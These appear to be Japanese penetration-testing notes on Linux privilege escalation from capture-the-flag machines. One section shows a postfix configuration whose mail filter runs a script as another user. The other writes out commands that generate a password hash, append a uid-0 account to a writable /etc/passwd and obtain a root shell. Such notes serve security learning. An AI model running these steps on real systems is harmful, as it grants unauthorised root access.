# linux
----
## SUID
* rootで動作しているデーモンは、setuid関数で任意のユーザのプロセスを生成できる
* 例えばそのようなデーモンにcronや、postfixがある。
* 加えて、postfixのようにメール送信をトリガとして、別ユーザのプロセスが動作するケースでは、プロセス監視では前記別ユーザのプロセスを観測できない可能性がある
* そのような場合、コンフィグファイルを閲覧し、判断しなければならない
  ```console
  kyle@writer:/etc/postfix$ cat master.cf | grep -v '#'
  smtp      inet  n       -       y       -       -       smtpd -o content_filter=dfilt:
  
  pickup    unix  n       -       y       60      1       pickup
  cleanup   unix  n       -       y       -       0       cleanup
  qmgr      unix  n       -       n       300     1       qmgr
  tlsmgr    unix  -       -       y       1000?   1       tlsmgr
  rewrite   unix  -       -       y       -       -       trivial-rewrite
  bounce    unix  -       -       y       -       0       bounce
  defer     unix  -       -       y       -       0       bounce
  trace     unix  -       -       y       -       0       bounce
  verify    unix  -       -       y       -       1       verify
  flush     unix  n       -       y       1000?   0       flush
  proxymap  unix  -       -       n       -       -       proxymap
  proxywrite unix -       -       n       -       1       proxymap
  smtp      unix  -       -       y       -       -       smtp
  relay     unix  -       -       y       -       -       smtp
          -o syslog_name=postfix/$service_name
  showq     unix  n       -       y       -       -       showq
  error     unix  -       -       y       -       -       error
  retry     unix  -       -       y       -       -       error
  discard   unix  -       -       y       -       -       discard
  local     unix  -       n       n       -       -       local
  virtual   unix  -       n       n       -       -       virtual
  lmtp      unix  -       -       y       -       -       lmtp
  anvil     unix  -       -       y       -       1       anvil
  scache    unix  -       -       y       -       1       scache
  postlog   unix-dgram n  -       n       -       1       postlogd
  maildrop  unix  -       n       n       -       -       pipe
    flags=DRhu user=vmail argv=/usr/bin/maildrop -d ${recipient}
  uucp      unix  -       n       n       -       -       pipe
    flags=Fqhu user=uucp argv=uux -r -n -z -a$sender - $nexthop!rmail ($recipient)
  ifmail    unix  -       n       n       -       -       pipe
    flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r $nexthop ($recipient)
  bsmtp     unix  -       n       n       -       -       pipe
    flags=Fq. user=bsmtp argv=/usr/lib/bsmtp/bsmtp -t$nexthop -f$sender $recipient
  scalemail-backend unix  -       n       n       -       2       pipe
    flags=R user=scalemail argv=/usr/lib/scalemail/bin/scalemail-store ${nexthop} ${user} ${extension}
  mailman   unix  -       n       n       -       -       pipe
    flags=FR user=list argv=/usr/lib/mailman/bin/postfix-to-mailman.py
    ${nexthop} ${user}
  dfilt     unix  -       n       n       -       -       pipe
    flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
  ```

## passwd
* Htb: Apocalyst
  ``` console
  falaraki@apocalyst:~$ openssl passwd -1 -salt salt password
  $1$salt$qJH7.N4xYta3aEG/dfqo/0
  falaraki@apocalyst:~$ echo 'test:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:root:/bin/bash' >> /etc/passwd
  falaraki@apocalyst:~$ su - test
  Password:
  No directory, logging in with HOME=/
  root@apocalyst:/root# id
  uid=0(root) gid=0(root) groups=0(root)
  ```
